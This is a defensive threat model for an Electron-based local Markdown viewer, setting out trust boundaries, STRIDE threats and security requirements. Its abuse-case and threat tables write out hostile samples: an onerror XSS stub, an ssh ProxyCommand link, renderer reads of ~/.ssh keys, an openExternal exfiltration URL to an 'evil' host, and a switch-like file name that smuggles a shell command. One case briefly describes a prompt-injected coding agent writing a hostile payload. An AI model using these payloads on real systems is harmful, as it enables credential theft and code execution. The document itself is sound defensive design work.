# galeo — Threat model

- **Status**: Approved (2026-09-26; design-time — to be verified against the built app by a
  security audit before each release)
- **Date**: 2026-09-25 (updated 2026-09-26)
- **Scope**: v0.1 "reader" and v0.2 "editor"
- **Related**: [PRD](../PRD.md) · [UX specification](../design/ux.md) ·
  ADRs [001](../decisions/ADR-001-app-shell-stack.md)–[008](../decisions/ADR-008-packaging-and-distribution.md), notably
  [ADR-004](../decisions/ADR-004-security-and-zero-network.md) (security & zero network),
  [ADR-005](../decisions/ADR-005-profiles-and-session-persistence.md) (profiles & sessions),
  [ADR-007](../decisions/ADR-007-platform-seam.md) (platform seam),
  [ADR-008](../decisions/ADR-008-packaging-and-distribution.md) (packaging)

Framed by the four questions: what are we building, what can go wrong, what are we doing about
it, did we do a good job.

## 1. What are we building

A local desktop app (Electron) that **renders untrusted text files** on a developer's machine.
There is no server, no account and no network use by design. The interesting risk is therefore
not a remote service being breached. It is **a file the user opens turning the viewer into a
foothold** on a machine that holds high-value secrets (SSH keys, cloud and git credentials,
client documents).

### Components and data flows

```
                      ┌───────────────────────── same user, same machine ──────────────────────────┐
  Terminal ──argv──▶ [gal launcher] ──argv──▶ ║B1║                                                   │
  Files app ─open──▶ (.desktop %F) ─────────▶ ║  ║  ┌──────────────── Main process (Node, full user privileges) ─┐
  Files app ─drag──────────────────────────────────▶│ single-instance lock · argv routing · profiles/sessions    │
                                              ║B2║  │ file read/write · watcher · quick-open walker · settings  │
  Same-user process ──second-instance msg──▶  ║  ║  │ galeo:// protocol · shell.openExternal / openPath            │
                                                    └───────┬──────────────────────────────▲─────────────────────┘
                                                        IPC ║B3║ (preload bridge)        ║B4║ disk (user files,
                                                            ▼                              ║  ║ ~/.config, ~/.local/state)
                                         ┌───────── Renderer per window (Chromium, sandboxed) ─────────┐
  Untrusted file content ═══║B5║═══════▶ │ app UI · Markdown pipeline · Shiki · KaTeX · Mermaid ·      │
  (md/mdx/txt/log, images, raw HTML)     │ CodeMirror · user custom CSS                                │
                                         └──────────────────────┬──────────────────────────────────────┘
                                                                ║B6║ network (must be closed)
                                                                ▼
                                                      Internet / LAN / OS URL handlers (║B7║)
  Build & release: npm registry ═║B8║═▶ CI (GitHub Actions) ═▶ .deb / AppImage ═▶ user install
```

### Trust boundaries

| # | Boundary | Crossing |
|---|---|---|
| B1 | Launcher → app | CLI arguments and `.desktop` `%F` paths enter the app (possibly crafted names) |
| B2 | Other processes → running instance | Single-instance message (argv, cwd) from any same-user process |
| B3 | Renderer → main (IPC) | Least-privileged, content-exposed process asks the full-privilege process to read/write/open |
| B4 | App ↔ disk | Reads of user files, writes of settings/sessions (v0.1), writes of user files on save (v0.2) |
| B5 | File content → renderer | **The primary boundary**: attacker-controlled bytes are parsed and rendered |
| B6 | Renderer/main → network | Must carry no traffic at all |
| B7 | App → OS handlers | `shell.openExternal` (URLs) and `shell.openPath` (files) hand control to other programs |
| B8 | Supply chain → shipped binary | Dependencies, build pipeline and release artifacts |

### Data classification

| Data | Class | Where |
|---|---|---|
| Contents of opened documents (client specs, plans, private notes) | **Confidential** | Memory, renderer |
| Other files readable by the user (`~/.ssh`, `.env`, credential stores) | **Secret**, never needed by galeo | Disk |
| Code execution as the user | **Critical** (all of the above, plus tokens) | Main process capabilities |
| File paths, recent files, session and profile names (reveal clients and projects) | Internal | `~/.config/galeo`, `~/.local/state/galeo` |
| Settings, custom CSS | Internal, user-owned | `~/.config/galeo` |
| The fact that a document was opened, and when (tracking pixels) | Confidential | Would leak only over the network |

## 2. Attack surface and attackers

Entry points, most exposed first:

1. **Content of any file opened** (B5): a README from a cloned repo, an article downloaded from
   the web, a file written by a coding agent that was **prompt-injected** into writing a hostile
   payload, a log containing attacker-controlled lines.
2. **Links and embedded references inside that content** (B5→B3→B7): `javascript:`, `file:`,
   custom URL schemes, relative paths, remote images.
3. **Files handed over by the desktop** (B1): double-clicks and drag-and-drop of arbitrarily named
   files.
4. **Other same-user processes** (B2, B4): the single-instance channel, settings and session files.
5. **The supply chain** (B8): roughly a thousand transitive npm packages, CI, release downloads.

**Realistic attackers**

- **Content author (primary)**: anyone who can get a file in front of the user (a repo, a
  download, an agent). Low cost, scalable, no need to target the user specifically.
- **Supply-chain attacker**: compromises a dependency or the release pipeline; reaches every user.
- **Same-user malware**: already has the user's privileges. **Out of scope** as an attacker
  (galeo cannot defend against it), but galeo must not *add* capabilities for it.

**Assumptions**: the OS, the user account and the physical machine are trusted; the system is
single-user or file permissions are standard; the user will open untrusted files, because that is
the product's job.

## 3. What can go wrong (STRIDE per boundary)

Ranking is likelihood × impact: **H**igh, **M**edium, **L**ow.

| ID | Boundary | STRIDE | Threat | Rank |
|---|---|---|---|---|
| T1 | B5 | E, I | **Script execution from content.** Raw HTML, SVG, `on*` handlers, `javascript:` URLs, Mermaid or KaTeX injection bugs, or a sanitizer bypass run script in the renderer. Combined with an over-broad IPC, that becomes file read/write or code execution. | **H** |
| T2 | B7 | E | **Handing control to the OS.** A link using a custom scheme (`vscode:`, `ssh:`, `x-scheme-handler`) passed to `openExternal` launches another app with attacker-chosen arguments. "Open with default app" on a `.desktop`, script or AppImage from a cloned repo runs it. | **H** |
| T3 | B6 | I | **Network exfiltration and tracking.** A remote image (tracking pixel), CSS `url()`, font, iframe, `fetch`/WebSocket, prefetch or WebRTC reveals that the document was opened, the user's IP address, or document text (CSS-selector exfiltration). This breaks the zero-network promise. | **H** |
| T4 | B5 | E | **Engine exploit.** A known Chromium/V8 vulnerability in an outdated Electron build is triggered by content, escapes the renderer and becomes code execution. | **H** (impact) / M (likelihood) |
| T5 | B8 | T, E | **Supply-chain compromise.** A malicious dependency version, a compromised GitHub Action, or a tampered release artifact. | M |
| T6 | B3 | E, I, T | **IPC abuse from a compromised renderer.** It asks main to read arbitrary files (`~/.ssh/id_ed25519`), to write arbitrary paths (`~/.bashrc`, in v0.2), calls privileged APIs with unvalidated arguments, or **uses `openExternal` to send data out through the system browser** (`https://evil/?d=<secret>`), bypassing the zero-network rule. | M |
| T7 | B1 | E | **Argument injection.** A file named like a Chromium or Node switch (`--remote-debugging-port=…`, `--inspect`, `--gpu-launcher=…`), or `ELECTRON_RUN_AS_NODE` / `NODE_OPTIONS` in the environment, turns the binary into a debugger or a general Node runtime. | M |
| T8 | B5, B4 | D | **Resource exhaustion.** Pathological Markdown (deep nesting, quadratic emphasis), giant tables, Mermaid or KaTeX bombs, 1 GB files, binary files, very fast writes (watcher floods), quick-open over huge trees or symlink loops. The app freezes or crashes. | M |
| T9 | B4 | T | **Data loss on save (v0.2).** Overwriting an agent's concurrent write, partial writes on crash, breaking symlinks or permissions, saving into the wrong file after a rename. | M |
| T10 | B4 | I | **Local metadata disclosure.** Session and recent-file lists reveal client names and paths to other local users, or through backups. Crash dumps include document content. | L |
| T11 | B2 | S, T | **Single-instance spoofing.** Another same-user process sends crafted argv/cwd to open files or trigger commands. | L |
| T12 | B5 | S | **UI spoofing / DOM clobbering.** Content imitates app UI (a fake "file missing" state, fake dialogs), or `id`/`name` attributes clobber app globals. | L |
| T13 | B5 | E | **Rich-renderer features.** KaTeX `\href`/`\htmlClass` with `trust`, Mermaid `click` callbacks and HTML labels, Shiki handling of unknown languages. | L (M if misconfigured) |
| T14 | B4 | T | **Tampered settings or custom CSS.** Malformed JSON crashes main. CSS hides or overlays content. | L |
| T15 | B3 | I | **Developer tools left on.** Production builds keep DevTools or remote debugging, which gives an easy full-renderer foothold. | L |
| T17 | B5, B8 | E | **Running renderers unsandboxed.** Chromium's sandbox is unavailable (the AppImage on Ubuntu 24.04+, where AppArmor restricts user namespaces) or disabled (`--no-sandbox` passed by a user, a wrapper or a crafted `.desktop`), so a content exploit (T1/T4) runs with full user privileges. | **H** |
| T16 | — | R | **Repudiation.** Not meaningful for a single-user local tool; there are no actions by other principals to attribute. | — (accepted) |

## 4. Abuse cases

| # | Story | Threats |
|---|---|---|
| A1 | As a hostile repo author, I put `<img src=x onerror=…>` and an inline `<svg><script>` in `README.md`, so that opening it runs my code. | T1, T13 |
| A2 | As a hostile author, I write `[Open docs](vscode://…)` or `[fix](ssh://-oProxyCommand=…)` so that one click launches another program with my arguments. | T2 |
| A3 | As a tracker, I embed `![](https://t.example/p.gif?doc=acme-plan)` so that I learn when, and from which IP, a client document is read. | T3 |
| A4 | As a hostile author, I ship `setup.desktop` next to `README.md`. The user's click on "Open with default app" in the can't-display state runs it. | T2 |
| A5 | As a prompt-injecting web page, I make a coding agent write a `plan.md` that the user will surely open in galeo, with a payload aimed at a Chromium CVE. | T4, T1 |
| A6 | As an attacker with script in the renderer, I call the preload API `readFile('/home/u/.ssh/id_ed25519')`, and in v0.2 `writeFile('~/.bashrc', …)`. | T6 |
| A10 | As an attacker with script in the renderer, I read a secret and call `openExternal('https://evil/?d=…')` so that the system browser exfiltrates it. | T6, T3 |
| A7 | As a hostile author, I name a file `--gpu-launcher=sh -c evil.md` and wait for the user to run `galeo *` in that folder. | T7 |
| A8 | As a hostile author, I commit a 300 MB `notes.md` with 10,000 nested lists and a Mermaid graph of 50,000 nodes, so that the user's session hangs on every restore. | T8 |
| A9 | As the user's own agent, I rewrite `article.mdx` while the user has unsaved edits, and one of us silently loses work. | T9 |

## 5. What we're doing about it: decisions and security requirements

Every threat has a decision. Mitigations become security requirements (SR) with acceptance
criteria, feeding ADR-004/005/007/008 and the tests that prove them.

| Threat | Decision | Requirement |
|---|---|---|
| T1, T12, T13 | Mitigate | SR-01, SR-02, SR-03 |
| T2 | Mitigate + eliminate (no OS-level URL scheme, no "open with default app" for executables) | SR-04, SR-05 |
| T3 | Mitigate (enforced, tested) | SR-06, SR-07 |
| T4 | Mitigate (hardening + update policy) | SR-01, SR-08, SR-09 |
| T5 | Mitigate | SR-10 |
| T6 | Mitigate | SR-11, SR-12 |
| T7, T15 | Mitigate | SR-08, SR-13 |
| T8 | Mitigate | SR-14 |
| T9 | Mitigate | SR-15 |
| T10 | Mitigate | SR-16 |
| T11 | **Accept.** Same-user processes already have equal privilege; the channel only opens files, which is intended behaviour. Owner: project owner. | SR-13 (argv handled as data) |
| T6 (residual) | **Accept.** A full renderer-process compromise can forge a drag-and-drop grant and read a local file into galeo, or, while the reader types, spend their key presses on quick-open listings, opens and the document's own links of its choosing. In v0.2 it can also write the one file the reader put in edit mode, while it is in edit mode, and the reader may confirm main's question about a file without reading its path. Exfiltration stays blocked (SR-04, SR-06, SR-12). Owner: project owner (writes: 2026-10-11, ADR-015). | SR-12 (drop grants from the preload's isolated world; input credits for quick open and links; edit mode only for read text, and main's own question for files the reader didn't hand over) |
| T14 | Mitigate | SR-17 |
| T17 | Mitigate (sandbox on by default; `.deb` ships the AppArmor `userns` profile; unsandboxed only by explicit per-launch user opt-in, with a persistent warning, ADR-008; the "sandbox unavailable" window runs unsandboxed with no document content, ADR-009). Residual risk accepted by the user who opts in. Owner: project owner (2026-09-26) | SR-01, SR-08 |
| T16 | **Accept.** Not applicable to a single-user local tool. Owner: project owner. | — |

### Security requirements

**SR-01 — Hardened renderers.** Every window: `contextIsolation: true`, `sandbox: true`,
`nodeIntegration: false`, `webSecurity: true`; no `<webview>`; `will-navigate` and
`setWindowOpenHandler` deny all real navigation and popups (in-tab navigation is app state, not
page navigation). Permission request and check handlers deny everything (camera, microphone,
geolocation, notifications, clipboard-read, HID, serial, USB) except `clipboard-sanitized-write`
(copy buttons).
The app **runs with Chromium's sandbox unless the user explicitly opts out for that launch**
(amended 2026-09-26, ADR-008, ADR-009): the user can pass `--no-sandbox`, or choose "Run without
sandbox" when the sandbox is unavailable. Nothing galeo ships passes the flag, except that the
Linux launcher wrapper relaunches with it after a real sandbox failure, to show that choice and
nothing else (ADR-009) (for example the AppImage on
Ubuntu 24.04+, where AppArmor restricts user namespaces); the default there is to quit. The choice
is never persisted, is fixed at process start (a forwarded launch can't change it), and every
window shows a persistent warning while unsandboxed. The `.deb` installs the AppArmor `userns`
profile that makes the sandbox work on Ubuntu 24.04+ (ADR-008).
*AC*: an automated test asserts these `webPreferences` for every created window, and that
`window.open`, top-level navigation and permission requests are refused; a test asserts that
with the sandbox unavailable and no opt-in, the app shows the error and exits (Quit is the
default); with `--no-sandbox`, every window shows the unsandboxed warning; a second launch with
`--no-sandbox` forwarded to a sandboxed instance leaves it sandboxed.

**SR-02 — Content is inert.** A strict Content-Security-Policy on app pages:
`default-src 'none'; script-src 'self'; worker-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' galeo: data:; font-src 'self'; connect-src 'self'`
(no `'unsafe-eval'` or `'wasm-unsafe-eval'`; Shiki uses its JavaScript regex engine).
No inline scripts, no `eval`. **Trusted Types**, enforced in every build: the Document Host
inserts HTML only through one policy (`galeo-document`); the only other policies are the render
worker's script URL (`galeo-worker`), DOMPurify's own (`dompurify`) and a `default` that passes text
with no markup (ADR-010).
Raw HTML in Markdown passes an allowlist sanitizer: no `script`, `style`, `iframe`, `object`,
`embed`, `form`, `base`, `meta` or `link` (prefetch and preconnect hints open connections the CSP
doesn't cover), no `svg`, `math`, `picture` or `source`; no event-handler attributes; no `style`
attributes; no `accesskey` or `tabindex`; only `http`, `https`, `mailto` and relative URLs
(protocol-relative `//host` counts as remote); ids and names prefixed to prevent clobbering.
Images never load by URL from the page: local ones wait for main's check (SR-12), remote ones
become placeholders.
MDX is parsed, never evaluated: imports and exports are dropped; components, their props and
`{expressions}` become text before the sanitizer runs; a lowercase tag with only string props
takes the raw-HTML path above. The one attribute the sanitizer adds for it, a text-only
`data-galeo-mdx` on `div`, `span`, `code`, `pre` and `dl`, carries no URL, script or style; raw HTML
in a Markdown file may use it too, which at most draws a box around that file's own content.
Documents render into a container isolated from the app's UI styles (for example Shadow DOM), so
content can neither restyle nor imitate app chrome.
*AC*: a corpus of known XSS/SVG/mXSS payloads, and of hostile MDX rendered as MDX, renders with
no script execution (detected by a test hook) and no CSP bypass.

**SR-03 — Safe rich renderers.** Mermaid runs with `securityLevel: 'strict'` (no click callbacks,
no HTML labels). KaTeX runs with `trust: false` and `maxExpand`/`maxSize` limits. Shiki falls back
to plain text for unknown languages. Diagram output SVG is sanitized before insertion.
*AC*: payload tests for Mermaid and KaTeX injection vectors pass.

**SR-04 — Only safe URLs reach the OS.** `shell.openExternal` accepts only `http:`, `https:` and
`mailto:` URLs, parsed and normalized in main, **and only URLs that appear literally in the link
set of the tab's document as read by main** (so a compromised renderer cannot build an
exfiltration URL), **rate-limited** to 1 per second per window, with a confirmation when one
document triggers more than 3 within 10 s; every other request is refused with a status-bar
message. galeo registers **no** OS-level URL scheme handler; `galeo://` is internal to the app
session only.
*AC*: unit tests for scheme handling, including case, whitespace, encoded and
`javascript:`/`file:` variants, link-set membership, and the rate limit.

**SR-05 — Never execute files.** "Open with default app" (`shell.openPath`) is offered only for
non-executable, non-launcher files: not `.desktop`, `.AppImage`, `.sh` or `.run`, not packages
(`.deb`, `.rpm`), not Java, Python or Flatpak apps (`.jar`, `.jnlp`, `.py`, `.pyz`, `.flatpakref`,
`.flatpakrepo`), and not the other platforms' launchers, judged by the name and, through
symlinks, by the file pointed to; not files with the executable bit, not directories, and only when the user chooses it in a **native context
menu built by main**. Otherwise only "Reveal in Files" is offered. Links to local
files always open inside galeo.
One clarification: galeo's own config files may also be opened from a page control, namely
"Open CSS" in the Settings tab (the global or the profile's `custom.css`) and "Open file" on a
settings notice. There, main picks the path itself; the page sends only a scope or the notice's
place in main's own list, never a path. The same checks apply before `shell.openPath`.
*AC*: tests for each blocked category; the config-file channels take no path.

**SR-06 — Zero network, enforced in main.** The default session cancels every request whose
scheme is not `galeo:`, `data:` or the app's own bundle (`onBeforeRequest`, which also covers
WebSocket). Below that, the network stack can't resolve any host (Chromium host-resolver rules
map every host, IP literals included, to "not found"), so traffic that never passes through
`onBeforeRequest` can't connect either. Spell-check dictionary download is disabled (sessions start
with no spell-check languages). WebRTC is removed from the app page (and restricted with
`webRTCIPHandlingPolicy: 'disable_non_proxied_udp'`), DNS prefetch is off (including Blink's
`<link rel=dns-prefetch>` handling), and there are no service workers. There is no auto-updater and no crash reporter upload. Remote images render as
placeholders naming the host (UX F11).
*AC*: SR-07.

**SR-07 — Zero network, proven.** CI runs the e2e suite with a payload corpus (remote `img`,
CSS `url()`, `@import`, fonts, iframes, `fetch`, WebSocket, WebRTC, prefetch links) under a
harness that records every socket `connect()` by the app process tree, for example with
`strace -f -e trace=connect`, or in a network namespace with a logging proxy.
*AC*: zero AF_INET/AF_INET6 `connect()` calls (Unix-domain sockets for D-Bus and the
single-instance lock are allowed); the build fails otherwise. The socket-level proof runs on
Linux (the official platform). macOS/Windows preview builds run the same payload corpus and
assert the in-app guard's cancelled-request counters, which covers the guard but not paths that
bypass it.

**SR-08 — Hardened binary.** Electron Fuses: `RunAsNode` off,
`EnableNodeOptionsEnvironmentVariable` off, `EnableNodeCliInspectArguments` off,
`OnlyLoadAppFromAsar` on, `EnableEmbeddedAsarIntegrityValidation` on, cookie encryption not
needed (no cookies). DevTools are disabled in release builds; there is no remote debugging port.
*AC*: a release-pipeline step verifies the fuse states of the packaged binary.

**SR-09 — Engine update policy.** Track Electron's supported release lines. Ship a release within
**7 days** of an Electron security release that fixes a critical or high Chromium/V8 issue; never
ship an Electron major that is out of support.
*AC*: a dependency bot (Renovate or Dependabot) on `electron`, and this policy documented in
`docs/RELEASING.md`.

**SR-10 — Supply chain.**
- Committed lockfile; `npm ci` only; install scripts disabled except for an allowlist.
- Dependencies are vetted before adoption (maintenance, licence, size) and kept few.
- `npm audit` / OSV scan in CI, failing on high severity.
- GitHub Actions pinned by commit SHA, with least-privilege `permissions:`.
- Releases are built only in CI, and ship `SHA256SUMS` plus GitHub artifact attestations
  (build provenance) ([ADR-017](../decisions/ADR-017-release-workflow-with-attestations.md)).
*AC*: CI configuration reviewed against this list before v0.1.

**SR-11 — Minimal, validated IPC.** The preload exposes a small, typed, galeo-specific API
(no generic `invoke(channel, …)`, no `ipcRenderer` exposure). Main validates every message: the
sender is the **main frame** of a galeo window with origin `galeo://app` (there are no
subframes), and argument types, sizes and schemas are checked. Schemas run **in main only**; the
preload and renderer carry types and channel names, not validation code. Events from main (tab
snapshots, settings) reach the page through fixed `on…` methods that pass the payload only, never
Electron's event object.
*AC*: each IPC handler has validation tests for malformed input and foreign senders.

**SR-12 — Capability-scoped file access.** Main reads files only when the request follows a user
action it can attribute: CLI/open-file events, drop grants created in the preload's isolated
world (`event.isTrusted`), a quick-open selection from the result list main sent, session
restore, or a link whose target main finds in the source of the tab's document (ADR-004).
Quick open lists a typed folder (`~/…`, `/…`), and opens any selection, only by spending a
credit of real input to that window: each key press, click or tap main observes (`input-event`)
earns one, for a second, at most five held. Following a link the document has spends one too,
whether it opens a file, moves to an anchor or opens the browser, and so do deleting the
window's profile, clearing recent files and installing the AppImage launcher. A compromised page
can then neither list folders, open files, follow links nor make those changes on its own, only
once per key the reader presses. Link
and image extraction runs in a worker thread in main with a time budget, so hostile input cannot
stall main.
Local images are served only after main finds their `src` in the document's image set, through
opaque `galeo://file/<id>` URLs. Reads are limited to regular files under the size caps.
Writes (v0.2) are allowed only to paths that main has marked **edit-enabled** after the user's
explicit edit command on that tab, observed by main itself (a `before-input-event` key such as
Ctrl+E, or a native menu item). The renderer cannot enable editing by itself, and cannot
write any other path. Each save also spends an input credit (one per real key or click).
Ctrl+E enables only a file main last read as text with content, so a save never creates a file.
A file the reader didn't hand over from the command line, Files or a second launch (one reached
through a link, a drop, quick open or recent files) is enabled only after the reader answers
*Edit* in main's native dialog naming its path (ADR-015). The renderer chooses the active tab, so
without that question it could steer the key press to a file of its choosing.
*AC*: tests showing a renderer-originated `write` to a non-edit-enabled path is rejected, and
that reads of paths never surfaced to the user are rejected; that Ctrl+E on a missing file is
refused by main, and that a tab the page makes active just before Ctrl+E is asked about, not
enabled (`edit.spec`).

**SR-13 — Arguments are data.** The launcher passes file arguments after a `--` separator and as
absolute paths. The `.desktop` entry uses `%F`. Main parses argv with a strict schema and never
forwards it to Chromium switches; the one Chromium switch a user may pass is `--no-sandbox`,
before the `--` separator, at first launch (SR-01). `second-instance` data is treated like argv:
files to open and the few documented flags, nothing else (a forwarded `--no-sandbox` is ignored).
Chromium itself acts on switches anywhere before `--`, so on Linux every entry point (desktop
entry, `/usr/bin/galeo`, AppImage, `gal`) goes through the launcher's argument handling
(ADR-009). At first launch, main refuses to start when a switch follows a file name without `--`.
*AC*: tests with switch-like file names (`--inspect`, `--gpu-launcher=…`, `--no-sandbox`) after
`--` open them as files.

**SR-14 — Bounded work.**
- Size thresholds from the PRD apply: Markdown over 5 MB is shown as source; binary files are
  detected.
- Parsing and rendering run off the UI thread where possible. Time budgets (initially 2 s) are
  enforced by **terminating and respawning the worker**, both the renderer's render worker and
  main's link/image extraction worker; the tab falls back to source view. The reader can ask to
  render it anyway, under a longer budget (60 s) that is enforced the same way.
- Mermaid (`maxTextSize`, `maxEdges`) and KaTeX (`maxExpand`, `maxSize`) have limits; one failing
  block shows an inline error.
- The own file watcher watches only open files (via their parent directories), coalesces events,
  and caps its rate.
- The quick-open walker is bounded (file count, depth, time), does not follow symlinks out of the
  root, and detects loops.
- Before inserting a document, the renderer sends main a "rendering tab X" breadcrumb. If a
  renderer crashes, galeo reloads the window with its tabs hibernated and marks the
  breadcrumb tab "crashed" so it is not auto-rendered again. After 3 crashes within a minute it
  stops reloading the tabs and shows a crash-loop message (Try again · Close window).
*AC*: a fuzz/pathological corpus in CI finishes within budgets without hangs; a crash-recovery
e2e test.

**SR-15 — Safe saves (v0.2, ADR-013).**
- Writes are atomic (temp file in the same directory, `fsync`, rename), except where a rename
  would change what the file is: a hard-linked file, or one whose owner or group the temp file
  can't take, is written in place; that write doesn't follow a symlink, and refuses a file other
  than the one main checked (swapped in by someone else between the check and the write).
- A symlinked file is written through to its target; mode and ownership are preserved. A file
  the user can't write is not replaced.
- Before writing, main compares the hash of the file's current bytes with the version the user
  loaded. On mismatch it refuses the save (UX F12) and never overwrites silently: the page asks
  the user first (*Keep mine* / *Load theirs*).
- A file deleted while it had unsaved edits is written back only on the user's *Save again*, and
  only if it is still gone; one that came back in the meantime is a mismatch. As with any save,
  a write by another program between main's check and its write isn't detected.
*AC*: e2e tests for concurrent external writes, a deleted file, symlinks and permissions (`edit.spec`); the
write path's atomic, in-place and refusal cases in the file system adapter's tests. A crash in
the middle of a save has no automated test: the atomic path writes the whole temp file before
the rename that replaces the old one.

**SR-16 — Local metadata hygiene.** Config and state directories are created `0700` and files
`0600`. Session files, their rotated snapshots, and recent files store paths, view state and
scroll positions only, never document content. Recent files are capped at 200 per profile, and
there is a "Clear recent files" command per profile. Crash dumps stay local, and the crash
reporter is not enabled for upload.
*AC*: tests for file modes and for no document content in state files.

**SR-17 — Robust configuration.** Settings and session files are schema-validated on load, and
galeo never crashes on them:
- **User-editable config** (`settings.json`, `profile.json`, `custom.css`): an invalid file is
  **left untouched**; galeo keeps using the last valid settings (defaults if there never were
  any) and shows a notice naming the file. It is never overwritten while invalid (ADR-005).
- **App-written state** (sessions): an invalid file is backed up, then the newest valid snapshot
  (`session.json.1…3`) is restored, and only then defaults.
 Custom CSS is applied only inside the document container and the app theme
layer; it cannot hide the tab bar or status bar (app chrome styles have precedence).
*AC*: tests with corrupt, huge and hostile settings and session files, including a hand edit
that stays untouched and a session recovered from a snapshot.

## 6. Did we do a good job? Coverage check

- Every trust boundary B1–B8 has at least one threat analysed: B1 (T7), B2 (T11), B3 (T6, T15),
  B4 (T8–T10, T14), B5 (T1, T4, T8, T12, T13, T17), B6 (T3), B7 (T2), B8 (T5, T17).
- Every entry point in §2 maps to requirements: content (SR-01–03, SR-14); links (SR-04, SR-05);
  desktop hand-over (SR-13); same-user processes (T11 accepted, SR-16, SR-17); supply chain
  (SR-08–10).
- Every threat has a decision. The accepted risks (T11, T16, and the T6 residual for forged drop
  grants) are documented with an owner.

## 7. Keeping it alive

Revisit this model when any of these arrive:
- a new entry point (an OS URL scheme, a plugin system, a "watch folder", an agent integration);
- new rendered formats that execute or embed content (HTML files, SVG as documents, PlantUML via
  a local Java process, Graphviz via WASM);
- any network feature (update checks, sync);
- Flatpak packaging (changes B4 and B7), or macOS/Windows becoming official (new entry points:
  macOS `open-file` events, Windows registry file associations; signing changes B8);
- an npm distribution channel (generic Electron binary: SR-08 does not hold for it);
- a change of shell (ADR-001 revisit triggers).

Before each release, a security audit verifies SR-01…SR-17 against the code, and the release
checklist records the result. Published audits: [v0.1](audits/2026-10-07-v0.1.md) and [v0.2](audits/2026-10-10-v0.2.md).
